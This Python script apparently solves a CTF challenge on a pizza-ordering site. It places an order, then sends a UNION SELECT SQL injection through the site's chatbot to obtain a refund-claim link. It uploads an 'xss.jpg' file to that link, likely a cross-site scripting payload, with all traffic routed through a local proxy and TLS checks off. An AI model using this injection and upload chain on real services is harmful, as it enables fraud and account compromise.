import requests
import string
import sys
import math
import re

url = 'https://pizza.hacktivity.h1ctf.com/pizzabot'
session = '098f7336200bbc80e0f03ccd6e197e60'
requests = requests.Session()
lastChat = 0

def getChat():
    params = {
        'session': session,
        'lastchat': lastChat
    }
    return requests.get(url, params=params)

def getLastMessage():
    global lastChat

    last = getChat().json().pop()
    lastChat = last['id']

    return last['message']

def sendMessage(message):
    payload = {
        'session': session,
        'message': message
    }

    return requests.post(url, data=payload, proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'https://127.0.0.1:8080'
        }, verify=False)

def sendOrder():
    return requests.post(
        "https://pizza.hacktivity.h1ctf.com/order",
        data=[("toppings[]", "1"),
            ("branch", "3281"),
            ("address[line_1])", "925 Jones St"),
            ("address[line_2]", "Apt 900"),
            ("address[line_3]", "Door on the left"),
            ("address[city]", "San Francisco"),
            ("address[state]", "CA"),
            ("address[zipcode]", "94109"),
            ("email", "pizza@zoeyinthe.cloud"),
            ("discount_code", "")
        ],
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'https://127.0.0.1:8080'
        },
        verify=False
    )

def sendClaim(claimUrl):
    return requests.post("https://pizza.hacktivity.h1ctf.com" + claimUrl,
        files={
            'pic': open('./xss.jpg', 'rb')
        },
        data=[("reason", "payload")],
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'https://127.0.0.1:8080'
        }, verify=False
    )

orderId = re.search('Order ID: (\w+)<br>', sendOrder().json()['screen_msg']).group(1)
print(orderId)

sendMessage('order')
response = sendMessage(f"' UNION SELECT '{orderId}', 14.49, 1 -- --")

claimUrl = re.search('href="(.+)" target', getLastMessage()).group(1)

print(claimUrl)

sendClaim(claimUrl)